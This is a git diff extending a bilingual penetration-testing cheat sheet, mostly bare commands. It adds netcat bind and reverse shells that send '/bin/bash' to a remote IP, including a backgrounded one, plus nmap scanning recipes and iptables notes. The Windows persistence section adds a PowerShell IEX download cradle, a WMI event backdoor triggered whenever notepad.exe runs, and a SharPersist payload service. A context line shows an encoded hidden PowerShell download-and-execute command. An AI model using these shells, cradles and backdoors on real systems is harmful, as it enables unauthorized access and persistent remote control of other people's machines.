@@ -39,6 +39,7 @@
 		- [SSH](#ssh)
 		- [Time and Date](#time-and-date)
 		- [Tmux](#tmux)
+        - [Searchsploit](#searchsploit)
 		- [Upgrading Shells](#upgrading-shells)
 		- [VirtualBox](#virtualbox)
 		- [virtualenv](#virtualenv)
@@ -310,6 +311,7 @@
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Sharpersist | https://github.com/mandiant/SharPersist |
 | Sharpup | https://github.com/GhostPack/SharpUp |
+| PowerLurk | https://github.com/Sw4mpf0x/PowerLurk |
 
 ### Exploit Databases
 
@@ -514,6 +516,113 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```c
 nc -lnvp <LPORT> < <FILE>
 nc <RHOST> <RPORT> > <FILE>
+```
+
+Listen on a port
+
+```c
+nc -nlvp <puerto>
+```
+
+Connect to a port
+
+```c
+nc -nv <ip> <puerto>
+ -e execute an executable.
+```
+
+Bind shell
+CONSOLA 1
+
+```c
+nc -nlvp <puerto> -e <shell> 
+```
+
+CONSOLA attacker
+
+```c
+nc -nv <puerto>
+```
+
+Reverse shell
+CONSOLA 1 
+
+```c
+nc -nlvp <puerto>
+```
+
+CONSOLA attacker
+
+```c
+nc -nv <puerto> -e <shell>
+```
+
+TCP SCAN
+
+```c
+nc -nvv -w 1 -z <ip> <puertos> (puertos en rango x-y)
+```c
+
+UDP SCAN
+
+```c
+nc -nv -u -z -w 1 <ip> <puertos>
+```
+
+Enviar una bash 
+
+```c
+nc -e /bin/bash IP PORT
+```
+
+Put the shell on the background 
+
+```c
+nohup nc -e /bin/bash IP PORT &
+```
+
+Enviar archivos
+1 Sender Machine 
+
+```c
+cat FILE | nc IP PORT
+```
+
+2 Receive Machine
+
+```c
+nc -nlvp PORT > FILE
+```
+
+Windows 
+
+```c
+nc.exe IP PORT -w 3 < FiletoDownload
+```
+
+```c
+while true; do nc -lv <listeningport> ; done
+```
+##### NCAT
+
+Similar to netcat. SSL connections
+
+Listen
+
+```c
+ncat -lvp <puerto>
+```
+Connect 
+
+```c
+ncat -v <puerto>
+```
+
+```c
+Flags
+-e <shell>
+--allow <ip> (permitir solo una ip)
+--ssl (habilita cifrado)
 ```
 
 ##### Impacket
@@ -1282,6 +1391,13 @@ sudo timedatectl set-local-rtc 1
 while [ 1 ]; do sudo ntpdate <RHOST>;done
 ```
 
+#### Searchsploit
+
+```c
+-x look at an exploit
+-m move to exploit folder
+```
+
 #### Tmux
 
 ```c
@@ -1445,6 +1561,126 @@ sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
 sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
 ls -lh /usr/share/nmap/scripts/*ssh*
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
+```
+Normal
+
+```c
+nmap -sT ip
+```
+PING SCAN-sN
+
+```c
+nmap -sn ip
+```
+
+SCAN SYN or hidden
+
+UDP SCAN
+
+```c
+nmap -sU ip
+```
+
+udp-proto-scanner.pl
+
+One port
+
+```c
+nmap -pPORT --open -T5 -v -n IP
+```
+
+Path of nmap scripts: /usr/share/nmap/scripts   
+interesting scripts: 
+    - smb-os-discovery.nse - Averiguar OS mediante SMB
+    - dns-zone-transfer.nse - Transferencia de zona
+
+
+```c
+nmap --script=dns-zone-transfer -p 53 <servidorDNS>
+```
+
+```c
+nmap -p- --open -T5 -v -n -oG allPorts IP 
+```
+
+extractPorts 
+
+```c
+nmap -sC -sV -p 80,2222 -oN allPorts IP
+```
+Format save -oN NOMBREFICHERO
+  
+Find specific scripts
+
+```c
+  locate .nse | xargs grep "categories" | grep -oP ‘".*?"’ | sort -u
+```
+
+```c
+nmap -p80 --script "names"
+```
+
+```c
+nmap -n -Pn -p 110, -sV IP -vv -A
+```
+
+```c
+nmap -Pn -p- IP
+```
+
+Scripts 
+
+```c
+nmap -sv -Pn -n --scripts=smb* IP
+```
+
+Find vulnerabilities
+
+```c
+nmap -Pn -n --script vuln IP
+```
+
+```c
+nmap -sV --script http-enum -p80 IP -oN webscan
+```c
+
+
+OUTPUT FORMAT 
+-oX xml format
+xsltproc <nmap-output.xml> -o <nmap-output.html> xsltproc target.xml -o /var/www/html/index.html
+ -oG version grepeable
+ -oN te lo guarda normal
+ 
+For Windows machines
+ 
+```c
+nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- IP -oN
+```
+
+```c
+ nmap -sS  --open -vvv -n -Pn -p- IP --max-retries 0  -oN
+```
+
+ 
+All ports Scan
+
+```c
+  nmap -sS --min-rate 5000 --open -vvv -n -v -Pn -p- IP  → 5000 packets per seconds
+
+
+  -sS simple scan
+  -min-rate paquetes por segundo 
+  -n no resolucion dns
+  -Pn no aplique host/discovery
+  -sC scripts basicos de enumeracion
+  -sV version y servicio en cada puerto
+  -obtener sistema operativo -O
+  - escaneo “completo” -A
+  ```
+
+```c
+  Nmap HTB ports=$(nmap -p- --min-rate=1000  -T4 IP PORT | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)nmap 
+
 ```
 
 #### Port Scanning
@@ -3982,6 +4218,33 @@ Options
 C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
 ```
 
+##### System Persistence
+
+###### Sharpersist
+
+```c
+SharPersist.exe -t service -c "C:\Windows\payload.exe" -n "legit-svc" -m add
+```
+
+###### WMI Event Subsriptions
+
+Import locally
+
+```c
+PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1
+```
+
+Download Cradle
+
+```c
+PS> powershell.exe -NoP -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Get-WmiEvent"
+```
+Execute each time notepad.exe is used
+
+```c
+powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+
 ###### COM Hijacks
 
 ```c
@@ -5217,6 +5480,42 @@ ls -R /home
 ls -la /opt
 dpkg -l
 uname -a
+```
+
+###### IPTables
+
+```c
+iptables -I INPUT 1 -s <ip> -j ACCEPT
+iptables -I OUTPUT 1 -d <ip> -j ACCEPT
+iptables -Z
+```
+
+List
+```c
+iptables -vn -L
+```
+
+Clean iptables
+
+```c
+iptables -F INPUT
+iptables -F OUTPUT
+```
+
+Path
+```c
+/etc/iptables
+```
+
+Last edit
+```c
+stat *
+```
+
+Search iptables rules
+
+```c
+/etc find . | grep iptab
 ```
 
 ##### Abusing Password Authentication
